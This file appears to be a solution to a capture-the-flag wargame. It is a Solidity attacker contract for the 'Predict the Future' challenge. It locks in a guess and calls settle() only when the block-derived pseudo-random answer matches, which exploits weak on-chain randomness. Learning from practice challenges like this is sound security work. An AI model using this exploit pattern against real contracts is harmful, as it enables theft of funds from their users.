pragma solidity 0.4.21;

import "../challenge/PredictTheFutureChallenge.sol";
contract PredictTheFutureChallengeAttacker {
    PredictTheFutureChallenge private predictTheFutureChallenge;

    function PredictTheFutureChallengeAttacker(address target) public payable {
        predictTheFutureChallenge = PredictTheFutureChallenge(target);
        predictTheFutureChallenge.lockInGuess.value(1 ether)(0);
    }

    function attack() {
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;
        if(answer == 0) {
            predictTheFutureChallenge.settle();
        }
    }

    function () external payable {}
}